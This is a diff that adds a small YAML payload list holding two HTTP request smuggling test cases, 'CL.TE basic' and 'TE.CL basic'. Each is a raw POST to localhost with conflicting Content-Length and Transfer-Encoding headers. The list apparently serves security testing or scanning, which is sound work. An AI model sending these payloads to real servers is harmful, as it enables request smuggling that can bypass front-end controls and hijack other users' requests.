@@ -1,0 +1,21 @@
+payloads:
+  - name: "CL.TE basic"
+    raw: |
+      POST / HTTP/1.1
+      Host: localhost
+      Content-Length: 4
+      Transfer-Encoding: chunked
+
+      0
+
+      SMUG
+  - name: "TE.CL basic"
+    raw: |
+      POST / HTTP/1.1
+      Host: localhost
+      Transfer-Encoding: chunked
+      Content-Length: 6
+
+      0
+
+      GARBAGE
